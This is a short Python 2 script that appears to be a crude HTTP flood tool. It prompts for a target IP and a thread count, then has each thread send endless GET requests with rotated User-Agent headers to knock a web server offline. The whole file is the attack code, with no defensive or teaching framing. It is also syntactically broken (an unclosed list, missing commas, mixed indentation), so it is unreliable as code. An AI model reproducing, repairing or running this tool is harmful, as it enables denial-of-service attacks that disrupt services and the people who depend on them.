import sys
import random
import requests
import threading

print (" ")
host = raw_input("IP : ")
thread_num = input("Threads : ")
print (" ")

user_agent = [
  "Mozilla/5.0 (Linux; Android 8.0.0; GM 5 Plus d Build/OSR18H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"   

def run():
	if len(sys.argv)>=1:
		url="http://"+host
		print "Destination IP Address",host 
        while True:
			headers={'User-Agent': random.choice(user_agent)}
			r = requests.get(url,headers=headers)
			
	else:
		print "Only Works on HTTP Server !!!"

for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
